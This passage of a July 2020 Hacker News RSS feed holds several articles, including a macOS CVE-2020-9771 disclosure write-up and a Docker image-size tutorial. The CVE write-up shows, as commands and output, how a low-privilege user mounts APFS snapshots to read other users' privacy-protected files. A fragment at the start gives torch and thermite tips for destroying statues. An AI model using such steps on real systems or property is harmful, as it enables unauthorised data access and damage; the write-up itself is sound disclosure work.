<p>Heat: You can reduce the team-sizes by weakening the materials – 40mins with a butane torch or 15-20 with propane torch.</p>
<p>Chem heat: Thermite around the ankles is more efficient than torches but is potentially harder to source</p>
<p>"Editor's Note: As national and worldwide attention to the removal of statues has grown, we have continued our reporting on the related science and safety issues, and have amended this article to reflect our findings."</p>
<hr>
<p><a name="dont-bug-me"></a><br>
<img src="https://i2.wp.com/craphound.com/images/privacynet.png?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/craphound.com/images/privacynet.png?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>

<p>The Privacy Analyzer from Privacy.net is a good, comprehensive way to check what kind of data your browser is leaking to the ad-tech industry:</p>
<p><a href="https://privacy.net/analyzer/">https://privacy.net/analyzer/</a></p>
<p>It steps through five separate tests:</p>
<p>I. Basic info (IP address, OS, etc)</p>
<p>II. Autofill leaks (does …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://pluralistic.net/2020/07/03/monument-toppling-season/#books">https://pluralistic.net/2020/07/03/monument-toppling-season/#books</a></em></p>]]>
            </description>
            <link>https://pluralistic.net/2020/07/03/monument-toppling-season/#books</link>
            <guid isPermaLink="false">hacker-news-small-sites-23731393</guid>
            <pubDate>Sat, 04 Jul 2020 10:29:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Panos Panay shows off his Surface Duo dual-screen Android smartphone]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23731369">thread link</a>) | @vvpvijay
<br/>
July 4, 2020 | https://androidrookies.com/microsoft-chief-product-officer-panos-panay-flaunts-surface-duo-dual-screen-android-smartphone/ | <a href="https://web.archive.org/web/*/https://androidrookies.com/microsoft-chief-product-officer-panos-panay-flaunts-surface-duo-dual-screen-android-smartphone/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-8388"><div><div><div><h2>Microsoft Chief Product Officer, Panos Panay shows off his Surface Duo dual-screen Android smartphone as Microsoft prepares for its launch</h2><p>Microsoft is getting ready to launch its new Surface Duo dual-screen Android smartphone. If you remember, Microsoft had unveiled the Surface Duo dual-screen Android phone at the October 2019 Surface event.</p><p>Microsoft doesn’t call Surface Duo a smartphone. It looks more of a smartphone + tablet kind and Microsoft refers to it as a <strong>communication device</strong>. It can make calls and can also be folded up to a size that fits comfortably in one hand and in your pants pocket. The Surface Duo was supposed to be released in late 2020 but it looks like Microsoft is preparing for its release before the holiday season starts. Some insiders believe that the Surface Duo could even be launched by August 2020 as Microsoft wants to launch it before Samsung introduces the new Galaxy Fold in early August.</p><p><iframe title="Introducing Surface Duo" width="702" height="395" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" data-src="https://www.youtube.com/embed/kU78s9ExFFA?feature=oembed" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></iframe></p><p>Surface Duo runs on the Android operating system and has dual 5.6-inch screens, but when unfolded, it can be used as an 8.3-inch tablet-like device. It can also be bent farther than flat – the full 360 degrees – for a front-to-back viewing mode. It may seem strange but Surface Duo looks to be an Android copy of Microsoft Surface New, a larger dual-screen tablet that runs a version of Windows 10 optimized for the two-display setup.</p><p>Microsoft has been releasing trailers like the one above, to keep its customers interested in Surface Duo. Outside of trailers, no one has seen a working Surface Duo, but that didn’t deter Panos Panay from flaunting Surface Duo online.</p><blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">I'm pretty pumped too, John. <a href="https://t.co/j0TmKtj6DG">pic.twitter.com/j0TmKtj6DG</a></p><p>— Panos Panay (@panos_panay) <a href="https://twitter.com/panos_panay/status/1278445960058863616?ref_src=twsrc%5Etfw">July 1, 2020</a></p></blockquote><p>Panos Panay is Microsoft’s Chief Product Officer and the man who turned Surface into the strong brand that it is today, He had posted images of his Surface Duo earlier but this one has a protective bumper. It is not known whether Microsoft plans to sell such Surface accessories or not.</p><p>The Surface Duo has two 5.6-inch screens, but unlike other foldable devices, its displays are made of Gorilla Glass – just split by a very visible hinge. The Duo will run Android 10/11 which supports foldable screens. Microsoft has said that the Duo would be compatible with all Android apps, and it’s currently working closely with Google to make Android apps that are suited to the dual-screen setup.</p></div></div></div></article><div><h3>About Author</h3><section> <img alt="" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20100%20100'%3E%3C/svg%3E" data-src="https://secure.gravatar.com/avatar/076b4a64b03cee86288f1132004881ab?s=100&amp;d=mm&amp;r=g" data-srcset="https://secure.gravatar.com/avatar/076b4a64b03cee86288f1132004881ab?s=200&amp;d=mm&amp;r=g 2x" height="100" width="100" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><div> <p>Hacker, coder, Jouno by night
When a good man is hurt, all who would be called good must suffer with him</p></div></section></div></div>]]>
            </description>
            <link>https://androidrookies.com/microsoft-chief-product-officer-panos-panay-flaunts-surface-duo-dual-screen-android-smartphone/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23731369</guid>
            <pubDate>Sat, 04 Jul 2020 10:21:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Targeted MitM attacks using information leakage in SSH clients [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 68 | Comments 83 (<a href="https://news.ycombinator.com/item?id=23731310">thread link</a>) | @based2
<br/>
July 4, 2020 | https://www.fzi.de/fileadmin/user_upload/2020-06-26-FSA-2020-2.pdf | <a href="https://web.archive.org/web/*/https://www.fzi.de/fileadmin/user_upload/2020-06-26-FSA-2020-2.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.fzi.de/fileadmin/user_upload/2020-06-26-FSA-2020-2.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-23731310</guid>
            <pubDate>Sat, 04 Jul 2020 10:01:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Reduce Node Docker Image Size by 10x]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23731249">thread link</a>) | @championshuttle
<br/>
July 4, 2020 | https://itsopensource.com/how-to-reduce-node-docker-image-size-by-ten-times/ | <a href="https://web.archive.org/web/*/https://itsopensource.com/how-to-reduce-node-docker-image-size-by-ten-times/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>Dockerizing an application is simple, effective, but optimizing the size of Docker Image is the tricky part. Docker is easy to use but once the application starts scaling, the image size inflates exponentially. In general, the node docker image size of the applications is over 1 GB most of the time.</p>
<h3>Why the Size matters</h3>
<ol>
<li>Large docker image sizes - Bigger image size requires more space means increased expense.</li>
<li>Long build durations - It takes a longer time to push the images over the network and results in CI Pipeline delays.</li>
</ol>
<h3>Let’s Start The Optimization</h3>
<p>Here is our <a href="https://github.com/championshuttler/fluentbit-dashboard">demo application</a> built using the VueJS Application. </p>
<p>Here is the initial Dockerfile.</p>
<div data-language="bash"><pre><code>FROM node:10

WORKDIR /app

COPY <span>.</span> /app

EXPOSE <span>8080</span>

RUN <span>npm</span> <span>install</span> http-server -g

RUN <span>npm</span> <span>install</span> <span>&amp;&amp;</span> <span>npm</span> run build

CMD http-server ./dist</code></pre></div>
<p>The size of this image is:</p>
<p><span>
      <a href="https://itsopensource.com/static/1aba1e73be853f41e369a610752fa9ab/7241a/docker1.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="docker1" title="docker1" src="https://itsopensource.com/static/1aba1e73be853f41e369a610752fa9ab/799d3/docker1.png" srcset="https://itsopensource.com/static/1aba1e73be853f41e369a610752fa9ab/00d96/docker1.png 148w,
https://itsopensource.com/static/1aba1e73be853f41e369a610752fa9ab/0b23c/docker1.png 295w,
https://itsopensource.com/static/1aba1e73be853f41e369a610752fa9ab/799d3/docker1.png 590w,
https://itsopensource.com/static/1aba1e73be853f41e369a610752fa9ab/2a3d6/docker1.png 885w,
https://itsopensource.com/static/1aba1e73be853f41e369a610752fa9ab/ae92f/docker1.png 1180w,
https://itsopensource.com/static/1aba1e73be853f41e369a610752fa9ab/7241a/docker1.png 2478w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
  </a>
    </span></p>
<p>It is 1.34GB! Whoops!</p>
<p>Let’s start optimizing step by step</p>
<ol>
<li>Use <strong>Multi-Stage</strong> Docker Builds</li>
</ol>
<p>Multi-stage builds make it easy to optimize Docker images by using multiple <strong>intermediate</strong> images in a single Dockerfile. Read more about it <a href="https://docs.docker.com/develop/develop-images/multistage-build/">here</a>. By using multi-stage builds, we can install all dependencies in the build image and copy them to the leaner runtime image.</p>
<div data-language="bash"><pre><code>FROM node:10 AS BUILD_IMAGE

WORKDIR /app

COPY <span>.</span> /app

EXPOSE <span>8080</span>

RUN <span>npm</span> <span>install</span> <span>&amp;&amp;</span> <span>npm</span> run build

FROM node:10

WORKDIR /app


COPY --from<span>=</span>BUILD_IMAGE /app/dist ./dist
COPY --from<span>=</span>BUILD_IMAGE /app/node_modules ./node_modules

RUN <span>npm</span> i -g http-server

CMD http-server ./dist</code></pre></div>
<p>Now the size of this image is 1.24GB:</p>
<p><span>
      <a href="https://itsopensource.com/static/6b9b07919be16cc2c5c399f5e2e6e50a/2e3fa/docker2.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="docker2" title="docker2" src="https://itsopensource.com/static/6b9b07919be16cc2c5c399f5e2e6e50a/799d3/docker2.png" srcset="https://itsopensource.com/static/6b9b07919be16cc2c5c399f5e2e6e50a/00d96/docker2.png 148w,
https://itsopensource.com/static/6b9b07919be16cc2c5c399f5e2e6e50a/0b23c/docker2.png 295w,
https://itsopensource.com/static/6b9b07919be16cc2c5c399f5e2e6e50a/799d3/docker2.png 590w,
https://itsopensource.com/static/6b9b07919be16cc2c5c399f5e2e6e50a/2a3d6/docker2.png 885w,
https://itsopensource.com/static/6b9b07919be16cc2c5c399f5e2e6e50a/ae92f/docker2.png 1180w,
https://itsopensource.com/static/6b9b07919be16cc2c5c399f5e2e6e50a/2e3fa/docker2.png 2812w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
  </a>
    </span></p>
<ol start="2">
<li>Remove Development Dependencies and use <strong>Node Prune</strong> Tool</li>
</ol>
<p>node-prune is an open-source tool for removing unnecessary files from the node_modules folder. Test files, markdown files, typing files and *.map files in Npm packages are not required at all in the production environment generally, most of the developers do not remove them from the production package. By using node-prune it can safely be removed.</p>
<p>We can use this to remove Development Dependencies:</p>

<p>After making these changes <code>Dockerfile</code> will look like:</p>
<div data-language="bash"><pre><code>FROM node:10 AS BUILD_IMAGE

RUN <span>curl</span> -sfL https://install.goreleaser.com/github.com/tj/node-prune.sh <span>|</span> <span>bash</span> -s -- -b /usr/local/bin

WORKDIR /app

COPY <span>.</span> /app

EXPOSE <span>8080</span>

RUN <span>npm</span> <span>install</span> <span>&amp;&amp;</span> <span>npm</span> run build


RUN <span>npm</span> prune --production


RUN /usr/local/bin/node-prune

FROM node:10

WORKDIR /app


COPY --from<span>=</span>BUILD_IMAGE /app/dist ./dist
COPY --from<span>=</span>BUILD_IMAGE /app/node_modules ./node_modules

RUN <span>npm</span> i -g http-server

CMD http-server ./dist</code></pre></div>
<p>By using this we reduced the overall size to 1.09GB</p>
<p><span>
      <a href="https://itsopensource.com/static/154740192b6235545546d6108aac8035/da73e/docker3.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="docker3" title="docker3" src="https://itsopensource.com/static/154740192b6235545546d6108aac8035/799d3/docker3.png" srcset="https://itsopensource.com/static/154740192b6235545546d6108aac8035/00d96/docker3.png 148w,
https://itsopensource.com/static/154740192b6235545546d6108aac8035/0b23c/docker3.png 295w,
https://itsopensource.com/static/154740192b6235545546d6108aac8035/799d3/docker3.png 590w,
https://itsopensource.com/static/154740192b6235545546d6108aac8035/2a3d6/docker3.png 885w,
https://itsopensource.com/static/154740192b6235545546d6108aac8035/ae92f/docker3.png 1180w,
https://itsopensource.com/static/154740192b6235545546d6108aac8035/da73e/docker3.png 2350w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
  </a>
    </span></p>
<ol start="3">
<li>Choose <strong>Smaller Final Base Image</strong></li>
</ol>
<p>When dockerizing a node application, there are lots of <a href="https://hub.docker.com/_/node/">base images</a> available to choose from.</p>
<p>Here we will use <strong>alpine</strong> image; alpine is a lean docker image with minimum packages but enough to run node applications.</p>
<div data-language="console"><pre><code>FROM node:10 AS BUILD_IMAGE

RUN curl -sfL https://install.goreleaser.com/github.com/tj/node-prune.sh | bash -s -- -b /usr/local/bin

WORKDIR /app

COPY . /app

EXPOSE 8080

RUN npm install &amp;&amp; npm run build

# remove development dependencies
RUN npm prune --production

# run node prune
RUN /usr/local/bin/node-prune

FROM node:10-alpine

WORKDIR /app

# copy from build image
COPY --from=BUILD_IMAGE /app/dist ./dist
COPY --from=BUILD_IMAGE /app/node_modules ./node_modules

RUN npm i -g http-server

CMD http-server ./dist</code></pre></div>
<p>By using this <code>Dockerfile</code> the image size dropped to <code>157MB</code> \o/</p>
<p><span>
      <a href="https://itsopensource.com/static/5b1ac48790d94a09ececf55a1e75372c/0b70a/docker4.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="docker4" title="docker4" src="https://itsopensource.com/static/5b1ac48790d94a09ececf55a1e75372c/799d3/docker4.png" srcset="https://itsopensource.com/static/5b1ac48790d94a09ececf55a1e75372c/00d96/docker4.png 148w,
https://itsopensource.com/static/5b1ac48790d94a09ececf55a1e75372c/0b23c/docker4.png 295w,
https://itsopensource.com/static/5b1ac48790d94a09ececf55a1e75372c/799d3/docker4.png 590w,
https://itsopensource.com/static/5b1ac48790d94a09ececf55a1e75372c/2a3d6/docker4.png 885w,
https://itsopensource.com/static/5b1ac48790d94a09ececf55a1e75372c/ae92f/docker4.png 1180w,
https://itsopensource.com/static/5b1ac48790d94a09ececf55a1e75372c/0b70a/docker4.png 2324w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
  </a>
    </span></p>
<h3>Conclusion</h3>
<p>By applying these 3 simple steps, we reduced our docker image size by 10 times.</p>
<p>Cheers!</p></section></div>]]>
            </description>
            <link>https://itsopensource.com/how-to-reduce-node-docker-image-size-by-ten-times/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23731249</guid>
            <pubDate>Sat, 04 Jul 2020 09:43:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CVE-2020-9771 – mount_apfs TCC bypass and privilege escalation]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23731160">thread link</a>) | @0x0
<br/>
July 4, 2020 | https://theevilbit.github.io/posts/cve_2020_9771/ | <a href="https://web.archive.org/web/*/https://theevilbit.github.io/posts/cve_2020_9771/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <h2 id="tldr">TL;DR</h2>
<p>We could mount the entire file system through APFS snapshots as read-only, with the <code>noowners</code> flag, which enables us accessing (almost) every file in the file system, including data (documents, files, etc…) of every user on the system, including those protected by Apple’s privacy framework (TCC). Even with the Guest account we could read files of admin accounts as Guest! 😱</p>
<p>This could be achieved with a single command, for example:
<code>mount_apfs -o noowners -s http://com.apple.TimeMachine.2019-11-17-141812.local /System/Volumes/Data /tmp/snap</code></p>
<p>This has been fixed in macOS Catalina 10.15.4 and on Mojave on the 26th of May.</p>
<h2 id="the-issues">The Issues</h2>
<p>There were two separate issues in this bug, and the combination of those became a very powerful system wide access.</p>
<ol>
<li>TCC privacy is not enforced on mounted local snapshots allowing someone to mount it and access any file inside, including those normally privacy protected</li>
<li>Initiating an APFS snapshot is available for all users, even low privileged ones, as well as listing of those. Beyond that, all users can mount local APFS snapshots, even a low privilege ones, and if used with the <code>noowners</code> flag, the low privilege user can access all data through the local snapshot, including every other users’ data (even high privileged one).</li>
</ol>
<h2 id="1-privacy-bypass">1. Privacy bypass</h2>
<p>From Terminal we can get a list of local snapshots available:</p>
<pre><code>% tmutil listlocalsnapshots /System/Volumes/Data
Snapshots for volume group containing disk /System/Volumes/Data:
com.apple.TimeMachine.2019-11-15-202744.local
com.apple.TimeMachine.2019-11-16-135116.local
com.apple.TimeMachine.2019-11-16-145028.local
com.apple.TimeMachine.2019-11-16-162241.local
com.apple.TimeMachine.2019-11-16-182353.local
com.apple.TimeMachine.2019-11-16-214156.local
com.apple.TimeMachine.2019-11-17-112126.local
com.apple.TimeMachine.2019-11-17-122313.local
</code></pre><p>We can mount one:</p>
<pre><code>csaby@mac ~ % /sbin/mount_apfs -o nobrowse,ro -s com.apple.TimeMachine.2019-11-16-182353.local /System/Volumes/Data /tmp/snap
</code></pre><p>If we navigate the user’s folder, we will be able access locations which our protected by TCC.</p>
<pre><code>csaby@mac ~ % ls -l /tmp/snap/Users/csaby/Library/Messages 
total 6224
drwx———@ 12 csaby  staff      384 Nov  6 13:56 Archive
drwx———  22 csaby  staff      704 Nov 13 20:22 Attachments
drwx———   4 csaby  staff      128 Nov  7 20:30 StickerCache
-rw-r———r———   1 csaby  staff   491520 Nov 16 08:19 chat.db
-rw-r———r———   1 csaby  staff    32768 Nov 15 14:43 chat.db-shm
-rw-r———r———   1 csaby  staff   436752 Nov 16 17:32 chat.db-wal
-rw-r———r———   1 csaby  staff    32768 Nov  4 09:36 prewarm.db
-rw-r———r———   1 csaby  staff    32768 Nov 16 08:09 prewarm.db-shm
-rw-r———r———   1 csaby  staff  1520312 Nov 16 08:09 prewarm.db-wal
</code></pre><p>if we compare it with standard access, it is not permitted:</p>
<pre><code>csaby@mac ~ % ls -l /Users/csaby/Library/Messages
ls: Messages: Operation not permitted
</code></pre><p>This is an issue as we can access every file through the local snapshot mountpoint.</p>
<p>We can also force the creation of a snapshot if there is no one:</p>
<pre><code>csaby@mac ~ % tmutil localsnapshot
Created local snapshot with date: 2019-11-17-140728
</code></pre><p>In short with <code>mount_apfs</code> we can completely bypass privacy protected folders.</p>
<h2 id="2--privilege-escalation">2.  “Privilege escalation”</h2>
<p>Although this method is not a full privilege escalation, as we don’t get higher privileges, however we can access files that belong to higher privilege users, and with the previous finding, this will include TCC protected data.</p>
<p>First, as a low privilege user we can create a local snapshot, and later list it to get its ID (this is not a bug). Although the second is not a hard requirement, as its ID can be figured out based on the time. Also snapshots are auto created by the system, so even if we can’t create one we can find one, and its ID is guessable, because it uses the following format: <code>yyyy-mm-dd-hhmmss</code>.</p>
<p>Here follows the demonstration of the issue. This is the low privileged ID I used:</p>
<pre><code>% id                       
uid=502(n00b) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),100(_lpoperator),702(com.apple.sharepoint.group.2),701(com.apple.sharepoint.group.1)
</code></pre><p>To show that it doesn’t have access to other user’s folder (where by-the-way, <code>csaby</code> is an admin user):</p>
<pre><code>n00b@mac Messages % ls -l /Users/csaby/Library 
ls: Library: Permission denied
</code></pre><p>Let’s create and list local snapshots:</p>
<pre><code>n00b@mac Messages % tmutil localsnapshot
Created local snapshot with date: 2019-11-17-141812

% tmutil listlocalsnapshots /
Snapshots for volume group containing disk /:
com.apple.TimeMachine.2019-11-17-133110.local
com.apple.TimeMachine.2019-11-17-133316.local
com.apple.TimeMachine.2019-11-17-141812.local
</code></pre><p>We can mount the snapshot with <code>noowners</code>, which according to the <code>manpage</code> means:</p>
<blockquote>
<p>Ignore the ownership field for the entire volume.  This causes all objects to appear as owned by user ID 99 and group ID 99.  User ID 99 is interpreted as the current effective user ID, while group ID 99 is used directly and translates to `unknown’.</p>
</blockquote>
<pre><code>n00b@mac Messages % mount_apfs -o noowners -s com.apple.TimeMachine.2019-11-17-141812.local /System/Volumes/Data /tmp/snap
mount_apfs: snapshot implicitly mounted readonly
</code></pre><p>And finally we can access all data from there as the privileges set for our user:</p>
<pre><code>% cd /tmp/snap/Users/csaby 
n00b@mac csaby % ls -l Library/Messages 
total 4704
-rw-r--r--  1 n00b  staff   258048 Nov  9 14:41 chat.db
-rw-r--r--  1 n00b  staff    32768 Nov 17 13:29 chat.db-shm
-rw-r--r--  1 n00b  staff  1507952 Nov  9 14:41 chat.db-wal
</code></pre><p>We can perform this attack even as a <code>Guest</code> account if FileVault is not turned ON. If FileVault is ON, Guest can only run Safari (after a reboot), and also the user data will be encrypted, so even if someone can break out the kiosk mode and start <code>Terminal</code> and run the above commands, he/she wouldn’t see the contents.</p>
<h2 id="the-fix-">The “Fix” 😭</h2>
<p>This requires some longer explanation as IMO the fix provided by Apple is not right.</p>
<p>At the beginning of March 2020, Apple said that the fix is shipped in Catalina 10.15.4 beta, they didn’t tell a word how they fixed it. I quickly jumped on it, and I found that the trick still works. I was puzzled. After some testing it turned out that they tied this to the Full Disk Access (FDA) right in TCC (<code>kTCCServiceSystemPolicyAllfiles</code>), which I found wrong. This is what I wrote them on the 13th of March:</p>
<blockquote>
<p>I did one more test and turned off “Full Disk Access” for Terminal, and then it indeed stopped working. I don’t consider this as a fix, relaying on TCC stopping this is a bad move in my opinion, most people will have Terminal set to “Full Disk Access”.</p>
<p>This still violates the basic BSD security model, as you can read other user’s file, without elevating to root. <strong>Even if SIP is OFF and Terminal has “Full Disk Access”, you shouldn’t be able to mount anything with “noowners” unless you are root</strong>. **The mount operation itself should fail.**If you think about it: Even if SIP is ON and Terminal has Full Disk Access, you can’t see other user’s files with it - with this vulnerability you can.</p>
<p>“Full Disk Access” TCC setting is global, which means that if an admin user enables this, a low privileged user can use Terminal to access the admin user’s files.</p>
</blockquote>
<p>I got a reply the same day:</p>
<blockquote>
<p>Thank you for providing additional information. We will investigate.</p>
</blockquote>
<p>After this point we went into, what I call “black hole mode”, I never got replies to my emails, and than <code>CVE-2020-9771</code> became public on the 26th of May. They shipped the fix to Mojave on that day (<a href="https://support.apple.com/en-us/HT211170),">https://support.apple.com/en-us/HT211170),</a> and retroactively updated the 10.15.4 security notes the same day with this CVE (<a href="https://support.apple.com/en-us/HT211100">https://support.apple.com/en-us/HT211100</a>). I tested this again, and I found the same behavior. At this point I still didn’t know if they considered this fixed or not, as no one came back to me. Their description “This issue was addressed with a new entitlement.” is extremely misleading.</p>
<p>I sent an email again on May 27th (still in “black hole mode”):</p>
<blockquote>
<p>I want to ask again if you consider this fixed via controlling this “exploit” via the “Full Disk Access” permission in TCC. As noted earlier I think it’s not right.</p>
</blockquote>
<p>Finally on the 29th of June I got a reply:</p>
<blockquote>
<p>This issue was addressed with macOS Catalina 10.15.5 and assigned CVE-2020-9771 -&gt;  <a href="https://support.apple.com/HT211170">https://support.apple.com/HT211170</a> . We are not planning any additional changes in this area.</p>
<p>macOS Catalina has improvements which have reduced the need for applications run through Terminal to require Full-Disk Access, and it should not be enabled by a user unless necessary.</p>
</blockquote>
<p>That’s it, not much I can do about this anymore, I only hope that it will get enough public attention, with many disappointed users about the fix, that 🍎 will reconsider the fix.</p>
<h2 id="conclusion">Conclusion</h2>
<p>The “Full Disk Access” right starts to get too much power these days, beyond controlling file access now it controls mounting, and also EndpointSecurity extensions.</p>
<p>This means that a user must be extremely careful which app is granted FDA right, because that will be able to access every user file on the system. If we grant for example <code>Terminal</code> this right, a low privilege user will be able to read our files through the app.</p>
<p>So until this is changed, please triple check what gets this right and what not.</p>

      </div></div>]]>
            </description>
            <link>https://theevilbit.github.io/posts/cve_2020_9771/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23731160</guid>
            <pubDate>Sat, 04 Jul 2020 09:17:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Software Engineering != Coding]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23731091">thread link</a>) | @FailMore
<br/>
July 4, 2020 | https://taaalk.co/t/software-engineering-coding#hn2 | <a href="https://web.archive.org/web/*/https://taaalk.co/t/software-engineering-coding#hn2">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <div target="spkr-color-">
            <div><div>
  <div><p>Right so yes I've spent over 25 years writing software for people in a professional capacity. As time has gone by, and I've learnt more about the process, I've slowly realised that actually writing code is actually quite a small part of the process. When I was a junior developer I probably spent 90% of my working day sat in front of an editor writing code. And I thought that was the job. Turns out it really isn't!Â&nbsp;</p></div><div><p>I think people both inside and outside of the industry fixate on coding for a number of reasons, and it's quite interesting to ruminate on those, but building software is so much more than writing code. Talking to users, agreeing on features, designing the interface, setting up the infrastructure, testing the platform for bugs, testing it for performance, providing support for it. These are all messy, imprecise things that have very human factors.Â&nbsp;</p></div><div><p>If you are a software engineer you can often seek solace in the code itself. Code is truth. You can't really argue with it. You can't argue with your compiler. It's really easy to fall into the trap of avoiding all work other than coding for these very reasons. But I would suggest that this makes you a really bad engineer! Engineering means getting your hands dirty, either literally in the case of Brunel, or from a human interaction point of view where software is concerned.</p></div>
</div>

            </div>
          </div>
        </div></div>]]>
            </description>
            <link>https://taaalk.co/t/software-engineering-coding#hn2</link>
            <guid isPermaLink="false">hacker-news-small-sites-23731091</guid>
            <pubDate>Sat, 04 Jul 2020 08:59:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Can we even make a Cloud by ourselves?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23731052">thread link</a>) | @rubenjs
<br/>
July 4, 2020 | https://serradas.org/can-we-even-make-a-cloud-by-ourselves | <a href="https://web.archive.org/web/*/https://serradas.org/can-we-even-make-a-cloud-by-ourselves">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>That's the question our ancestors have made since Atlantean Times. I'll explain
why don't we see more public clouds out there and some ideas for the future.</p><ul><li><a href="#current">The Current State of Affairs in 2019 and 2020</a></li><li><a href="#cloud">What's the cloud anyways?</a>: We'll see what a cloud is and what constitutes a Minimum Viable Cloud.</li><li><a href="#why-not">Why don't we build a cloud?</a></li></ul><p>Let's get down to it.</p><a name="current"></a><h3>The State of Affairs</h3><p><strong>Why does this question even matter?</strong> The Cloud Computing ecosystem changes constantly, and we want to be informed to make decisions.
There are 3 trends happening right now in the cloud world:</p><ul><li><strong>Companies are increasingly migrating their workloads to the public clouds</strong>.
2020 is the year when workloads are higher on the public clouds than on private solutions.</li><li><strong>The market is being dominated by big players</strong>.</li><li><strong>The cloud compute is hybrid.</strong></li></ul><p><strong>Majority of workloads will go to the cloud in 2020.</strong> From <a href="https://allcloud.io/go/2020-cloud-infrastructure-report/">AllCloud's Cloud Infrastructure Report</a>
and <a href="https://info.flexera.com/SLO-CM-REPORT-State-of-the-Cloud-2020">Flexera's 2020 State of the Cloud Report</a>
more than 50 percent of enterprise workloads and data are expected to be in a public cloud within 12 months. This event
didn't take the industry by surprise: there are reports that projected the change to happen this year. It was accelerated due
to the pandemic.</p><p><span>
      <span></span>
  <img alt="alt text" title="Cloud vs on premise usage" src="https://serradas.org/static/649af0258e3aa071dd7b4f45a3453775/6c18f/cloud-usage.png" srcset="https://serradas.org/static/649af0258e3aa071dd7b4f45a3453775/5243c/cloud-usage.png 240w,https://serradas.org/static/649af0258e3aa071dd7b4f45a3453775/ab158/cloud-usage.png 480w,https://serradas.org/static/649af0258e3aa071dd7b4f45a3453775/6c18f/cloud-usage.png 887w" sizes="(max-width: 887px) 100vw, 887px" loading="lazy">
    </span></p><p><strong>Amazon is leading the Cloud Market.</strong> AWS has one third of the cloud market share followed by Microsoft's Azure.
The cloud business is a <a href="https://en.wikipedia.org/wiki/Network_effect">network effect</a> business.
Its value increases according to the number of other clients using it. AWS counts with the biggest educational network,
consulting companies, blog spots, documentation from third party providers, and the AWS Marketplace.
Amazon will continue to dominate the market.</p><undefined><a href="https://www.statista.com/chart/18819/worldwide-market-share-of-leading-cloud-infrastructure-service-providers/" title="Infographic: Amazon Leads $100 Billion Cloud Market | Statista"><img src="https://cdn.statcdn.com/Infographic/images/normal/18819.jpeg" alt="Infographic: Amazon Leads $100 Billion Cloud Market | Statista" width="100%" height="auto"><br></a> You will find more infographics at <a href="https://www.statista.com/chartoftheday/">Statista</a></undefined><p><strong>The cloud computing future is hybrid.</strong> The industry is adopting a hybrid approach for its infrastructure needs.
Companies are using multiple public and private clouds at the same time.
Teams are taking advantage from different cloud provider's services.
Only one cloud provider is not enough to meet most of the companies requirements.</p><p><span>
      <span></span>
  <img alt="alt text" title="Hybrid Cloud Usage" src="https://serradas.org/static/7d6398eab4a1e860810a6dba09111129/e5e03/types-of-cloud.png" srcset="https://serradas.org/static/7d6398eab4a1e860810a6dba09111129/5243c/types-of-cloud.png 240w,https://serradas.org/static/7d6398eab4a1e860810a6dba09111129/ab158/types-of-cloud.png 480w,https://serradas.org/static/7d6398eab4a1e860810a6dba09111129/e5e03/types-of-cloud.png 891w" sizes="(max-width: 891px) 100vw, 891px" loading="lazy">
    </span></p><p><strong>We're living exciting years for the cloud.</strong> The old ways of managing our computing workloads are giving way to
more flexible solutions provided by private and public cloud providers. Amazon has most of the cloud market share, thanks to its network
effect. But even if Amazon dominates the market, companies are using more than one cloud provider for their needs.</p><a name="cloud"></a><h3>What's the cloud anyways?</h3><p>To understand what the cloud is. We need to see what cloud computing is.
Later, we'll define the different functionalities we need in order to have a minimum viable cloud.</p><p><strong>Cloud Definition.</strong> From Wikipedia we have:</p><blockquote><p>Cloud computing is the on-demand availability of computer system resources,
